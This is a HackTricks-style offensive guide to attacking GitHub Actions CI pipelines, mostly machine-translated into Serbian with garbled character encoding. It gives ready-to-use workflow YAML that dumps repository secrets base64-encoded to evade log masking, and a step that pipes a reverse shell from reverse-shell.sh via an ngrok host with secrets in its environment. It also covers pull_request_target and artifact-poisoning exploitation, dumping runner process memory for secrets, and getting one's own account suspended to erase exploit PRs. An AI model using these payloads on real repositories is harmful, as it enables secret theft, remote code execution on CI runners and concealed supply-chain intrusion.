# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **Steal** the **secrets** from that repo/organization.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privileges** to access other platforms such as AWS and GCP.
* **Execute code in custom workers** (if custom workers are used) and try to pivot from there.
* **Overwrite** repository **code**.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **Compromise** **deployments** and other **artifacts**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Odobri PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Kreiraj PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Imajte na umu da Ä‡ete u nekoliko sluÄajeva moÄ‡i da pronaÄ‘ete **github korisniÄke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu dati viÅ¡e privilegija nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>Lista tajni u Github Action izlazu</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverzne ljuske sa tajnama</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

MoguÄ‡e je proveriti dozvole date Github Token-u u repozitorijumima drugih korisnika **proveravanjem logova** akcija:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljena IzvrÅ¡enja

{% hint style="info" %}
Ovo bi bio najlakÅ¡i naÄin da se kompromituju Github akcije, jer ovaj sluÄaj podrazumeva da imate pristup **kreiranju novog repozitorijuma u organizaciji**, ili imate **privilegije pisanja nad repozitorijumom**.

Ako ste u ovom scenariju, moÅ¾ete samo proveriti [Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### IzvrÅ¡enje iz Kreiranja Repozitorijuma

U sluÄaju da Älanovi organizacije mogu **kreirati nove repozitorijume** i moÅ¾ete izvrÅ¡avati github akcije, moÅ¾ete **kreirati novi repozitorijum i ukrasti tajne postavljene na nivou organizacije**.

### IzvrÅ¡enje iz Nove Grane

Ako moÅ¾ete **kreirati novu granu u repozitorijumu koji veÄ‡ sadrÅ¾i konfigurisan Github Action**, moÅ¾ete ga **modifikovati**, **otpremiti** sadrÅ¾aj, a zatim **izvrÅ¡iti tu akciju iz nove grane**. Na ovaj naÄin moÅ¾ete **izvuÄ‡i tajne na nivou repozitorijuma i organizacije** (ali morate znati kako se zovu).

MoÅ¾ete napraviti da modifikovana akcija bude izvrÅ¡na **ruÄno,** kada se **kreira PR** ili kada se **neki kod otpremi** (u zavisnosti od toga koliko Å¾elite da budete uoÄljivi):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forkovana IzvrÅ¡enja

{% hint style="info" %}
Postoje razliÄiti okidaÄi koji bi mogli omoguÄ‡iti napadaÄu da **izvrÅ¡i Github akciju iz drugog repozitorijuma**. Ako su ti okidaÄi loÅ¡e konfigurisani, napadaÄ bi mogao da ih kompromituje.
{% endhint %}

### `pull_request`

OkidaÄ radnog toka **`pull_request`** Ä‡e izvrÅ¡iti radni tok svaki put kada se primi pull request uz neke izuzetke: po defaultu, ako je to **prvi put** da **saradjujete**, neki **odrÅ¾avaoc** Ä‡e morati da **odobri** **izvrÅ¡enje** radnog toka:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PoÅ¡to je **podrazumevano ograniÄenje** za **prvake** u doprinosima, mogli biste doprineti **ispravljanjem vaÅ¾eÄ‡e greÅ¡ke/pravopisne greÅ¡ke** i zatim poslati **druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da kreirate nalog sa imenom nekoga ko je doprineo projektu i obrisao njegov nalog.~~
{% endhint %}

Pored toga, po defaultu **spreÄava pisane dozvole** i **pristup tajnama** ciljanom repozitorijumu kao Å¡to je pomenuto u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Sa izuzetkom `GITHUB_TOKEN`, **tajne se ne prosleÄ‘uju izvrÅ¡iocu** kada se radni tok pokrene iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima dozvole samo za Äitanje** u pull request-ima **iz forkovanih repozitorijuma**.

NapadaÄ bi mogao da izmeni definiciju Github akcije kako bi izvrÅ¡io proizvoljne stvari i dodao proizvoljne akcije. MeÄ‘utim, neÄ‡e moÄ‡i da ukrade tajne ili prepiÅ¡e repozitorijum zbog pomenutih ograniÄenja.

{% hint style="danger" %}
**Da, ako napadaÄ promeni u PR-u github akciju koja Ä‡e biti pokrenuta, njegova Github akcija Ä‡e biti ta koja Ä‡e se koristiti, a ne ona iz originalnog repozitorijuma!**
{% endhint %}

PoÅ¡to napadaÄ takoÄ‘e kontroliÅ¡e kod koji se izvrÅ¡ava, Äak i ako nema tajni ili pisanih dozvola na `GITHUB_TOKEN`, napadaÄ bi mogao, na primer, **da otpremi zlonamerne artefakte**.

### **`pull_request_target`**

OkidaÄ radnog toka **`pull_request_target`** ima **pisane dozvole** za ciljani repozitorijum i **pristup tajnama** (i ne traÅ¾i dozvolu).

Napomena da okidaÄ radnog toka **`pull_request_target`** **izvrÅ¡ava u osnovnom kontekstu** i ne u onom koji daje PR (da **ne izvrÅ¡ava nepouzdani kod**). Za viÅ¡e informacija o `pull_request_target` [**proverite dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Pored toga, za viÅ¡e informacija o ovoj specifiÄnoj opasnoj upotrebi proverite ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

MoÅ¾e izgledati kao da je **izvrÅ¡eni radni tok** onaj definisan u **osnovi** i **ne u PR-u**, pa je **sigurno** koristiti **`pull_request_target`**, ali postoje **neki sluÄajevi kada to nije**.

A ovaj Ä‡e imati **pristup tajnama**.

### `workflow_run`

OkidaÄ [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omoguÄ‡ava pokretanje radnog toka iz drugog kada je `zavrÅ¡en`, `traÅ¾en` ili `u toku`.

U ovom primeru, radni tok je konfiguran da se izvrÅ¡i nakon Å¡to se zavrÅ¡i odvojeni "Pokreni testove" radni tok:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: Workflow pokrenut dogaÄ‘ajem `workflow_run` moÅ¾e **pristupiti tajnama i pisati tokene, Äak i ako prethodni workflow nije**.

Ova vrsta workflow-a moÅ¾e biti napadnuta ako **zavisi** od **workflow-a** koji moÅ¾e biti **pokrenut** od strane spoljnog korisnika putem **`pull_request`** ili **`pull_request_target`**. Nekoliko ranjivih primera moÅ¾e se [**pronaÄ‡i u ovom blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi se sastoji od **`workflow_run`** pokrenutog workflow-a koji preuzima napadaÄev kod: `${{ github.event.pull_request.head.sha }}`\
Drugi se sastoji od **prosleÄ‘ivanja** **artifact-a** iz **nepouzdanog** koda u **`workflow_run`** workflow i koriÅ¡Ä‡enja sadrÅ¾aja ovog artifact-a na naÄin koji ga Äini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvrÅ¡ava iz pull\_request-a koriÅ¡Ä‡eni/preuzeti kod dolazi iz originala ili iz fork-ovanog PR-a

## Zloupotreba Forkovane IzvrÅ¡avanja

Pomenuli smo sve naÄine na koje spoljaÅ¡nji napadaÄ moÅ¾e uspeti da pokrene github workflow, sada hajde da pogledamo kako ova izvrÅ¡avanja, ako su loÅ¡e konfigurisana, mogu biti zloupotrebljena:

### Nepouzdan checkout izvrÅ¡avanje

U sluÄaju **`pull_request`,** workflow Ä‡e biti izvrÅ¡en u **kontekstu PR-a** (tako da Ä‡e izvrÅ¡iti **maliciozni kod PR-a**), ali neko mora prvo da **odobri** i biÄ‡e pokrenut sa nekim [ograniÄenjima](./#pull\_request).

U sluÄaju workflow-a koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od workflow-a koji moÅ¾e biti pokrenut iz **`pull_request_target` ili `pull_request`**, kod iz originalnog repozitorijuma Ä‡e biti izvrÅ¡en, tako da **napadaÄ ne moÅ¾e kontrolisati izvrÅ¡eni kod**.

{% hint style="danger" %}
MeÄ‘utim, ako **akcija** ima **eksplicitni PR checkout** koji Ä‡e **uzeti kod iz PR-a** (a ne iz osnove), koristiÄ‡e kod pod kontrolom napadaÄa. Na primer (proverite liniju 12 gde se preuzima kod PR-a):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepouzdan kod se izvrÅ¡ava tokom `npm install` ili `npm build`** jer su skripte za izgradnju i referencirane **pakete pod kontrolom autora PR-a**.

{% hint style="warning" %}
Github dork za pretragu ranjivih akcija je: `event.pull_request pull_request_target extension:yml` meÄ‘utim, postoje razliÄiti naÄini za konfiguraciju poslova da se izvrÅ¡avaju sigurno Äak i ako je akcija konfigurisana nesigurno (kao Å¡to je koriÅ¡Ä‡enje uslovnih izraza o tome ko je akter koji generiÅ¡e PR).
{% endhint %}

### Kontekst Injekcije Skripti <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Napomena da postoje odreÄ‘eni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) Äije vrednosti su **kontrolisane** od strane **korisnika** koji kreira PR. Ako github akcija koristi te **podatke za izvrÅ¡avanje bilo Äega**, to moÅ¾e dovesti do **izvrÅ¡avanja proizvoljnog koda:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Injekcija Skripti** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Iz dokumenata: MoÅ¾ete uÄiniti **promenljivu okruÅ¾enja dostupnom za sve naredne korake** u workflow poslu tako Å¡to Ä‡ete definisati ili aÅ¾urirati promenljivu okruÅ¾enja i napisati to u **`GITHUB_ENV`** datoteku okruÅ¾enja.

Ako bi napadaÄ mogao **ubaciti bilo koju vrednost** unutar ove **env** promenljive, mogao bi ubaciti env promenljive koje bi mogle izvrÅ¡iti kod u sledeÄ‡im koracima kao Å¡to su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovo**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovo**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje da je uploadovani artifact siguran da Äuva svoj sadrÅ¾aj unutar **`GITHUB_ENV`** env promenljive. NapadaÄ bi mogao da uploaduje neÅ¡to poput ovoga da bi ga kompromitovao:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Ranjive TreÄ‡e Strane Github Akcije

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao Å¡to je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github Akcija omoguÄ‡ava pristup artifact-ima iz razliÄitih workflow-a i Äak repozitorijuma.

Glavni problem je Å¡to ako **`path`** parametar nije postavljen, artifact se ekstrahuje u trenutni direktorijum i moÅ¾e prepisati datoteke koje bi kasnije mogle biti koriÅ¡Ä‡ene ili Äak izvrÅ¡ene u workflow-u. Stoga, ako je Artifact ranjiv, napadaÄ bi mogao da zloupotrebi ovo da kompromituje druge workflow-e koji veruju Artifact-u.

Primer ranjivog workflow-a:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto ovim radnim tokom:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Drugi Spoljni Pristup

### Otimanje Izbrisanog Namespace Repozitorijuma

Ako nalog promeni svoje ime, drugi korisnik bi mogao da registruje nalog sa tim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github Ä‡e omoguÄ‡iti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj koji je izbrisan.

{% hint style="danger" %}
Dakle, ako neka akcija koristi repozitorijum sa nepostojeÄ‡eg naloga, joÅ¡ uvek je moguÄ‡e da napadaÄ moÅ¾e da kreira taj nalog i kompromituje akciju.
{% endhint %}

Ako su drugi repozitorijumi koristili **zavisnosti iz ovih korisniÄkih repozitorijuma**, napadaÄ Ä‡e moÄ‡i da ih otme. Ovde imate potpunije objaÅ¡njenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivotiranje

{% hint style="info" %}
U ovom odeljku Ä‡emo govoriti o tehnikama koje bi omoguÄ‡ile da se **pivota sa jednog repozitorijuma na drugi**, pod pretpostavkom da imamo neku vrstu pristupa prvom (proverite prethodni odeljak).
{% endhint %}

### Trovanje KeÅ¡om

KeÅ¡ se odrÅ¾ava izmeÄ‘u **izvrÅ¡avanja radnih tokova u istoj grani**. Å to znaÄi da ako napadaÄ **kompromituje** **paket** koji se zatim Äuva u keÅ¡u i **preuzima** i izvrÅ¡ava ga **privilegovaniji** radni tok, on Ä‡e moÄ‡i da **kompromituje** i taj radni tok.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje Artefaktima

Radni tokovi mogu koristiti **artefakte iz drugih radnih tokova i Äak repozitorijuma**, ako napadaÄ uspe da **kompromituje** Github Akciju koja **otprema artefakt** koji se kasnije koristi od strane drugog radnog toka, on bi mogao da **kompromituje druge radne tokove**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Eksploatacija iz Akcije

### Pristupanje AWS i GCP putem OIDC

Proverite sledeÄ‡e stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristupanje tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadrÅ¾aj u skriptu, zanimljivo je znati kako moÅ¾ete pristupiti tajnama:

* Ako je tajna ili token postavljen na **promenljivu okruÅ¾enja**, moÅ¾e se direktno pristupiti kroz okruÅ¾enje koristeÄ‡i **`printenv`**.

<details>

<summary>Lista tajni u izlazu Github Akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverzne ljuske sa tajnama</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript se Äuva **na disku** i moÅ¾e se pristupiti.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript akcije, tajne se Å¡alju kroz promenljive okruÅ¾enja.
* ```bash
ps axe | grep node
```
*   Za **prilagoÄ‘enu akciju**, rizik moÅ¾e varirati u zavisnosti od toga kako program koristi tajnu koju je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba samostalnih pokretaÄa

NaÄin da se pronaÄ‘e koje **Github akcije se izvrÅ¡avaju u ne-github infrastrukturi** je da se pretraÅ¾i za **`runs-on: self-hosted`** u konfiguraciji Github akcije yaml.

**Samostalni** pokretaÄi mogu imati pristup **dodatnim osetljivim informacijama**, drugim **mreÅ¾nim sistemima** (ranjivi krajnji taÄki u mreÅ¾i? servis za metapodatke?) ili, Äak i ako je izolovan i uniÅ¡ten, **viÅ¡e od jedne akcije moÅ¾e biti pokrenuto u isto vreme** i zlonamerna moÅ¾e **ukrasti tajne** od druge.

U samostalnim pokretaÄima takoÄ‘e je moguÄ‡e dobiti **tajne iz \_Runner.Listener**\_\*\* procesa\*\* koji Ä‡e sadrÅ¾ati sve tajne radnih tokova u bilo kojoj fazi tako Å¡to Ä‡e se isprazniti njegova memorija:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Proverite [**ovaj post za viÅ¡e informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

MoguÄ‡e je napraviti Github akcije koje Ä‡e **izgraditi i saÄuvati Docker sliku unutar Github-a**.\
Primer se moÅ¾e naÄ‡i u sledeÄ‡em proÅ¡irivom:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao Å¡to ste mogli videti u prethodnom kodu, Github registry je hostovan na **`ghcr.io`**.

Korisnik sa pravima Äitanja nad repozitorijumom Ä‡e moÄ‡i da preuzme Docker sliku koristeÄ‡i liÄni pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Sensitive info in Github Actions logs

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Covering your Tracks

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) First of all, any PR raised is clearly visible to the public in Github and to the target GitHub account. In GitHub by default, we **canâ€™t delete a PR of the internet**, but there is a twist. For Github accounts that are **suspended** by Github, all of their **PRs are automatically deleted** and removed from the internet. So in order to hide your activity you need to either get your **GitHub account suspended or get your account flagged**. This would **hide all your activities** on GitHub from the internet (basically remove all your exploit PR)

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share â€œsome stuffâ€ in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

{% hint style="warning" %}
The only way for an organization to figure out they have been targeted is to check GitHub logs from SIEM since from GitHub UI the PR would be removed.
{% endhint %}

## Tools

The following tools are useful to find Github Action workflows and even find vulnerable ones:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
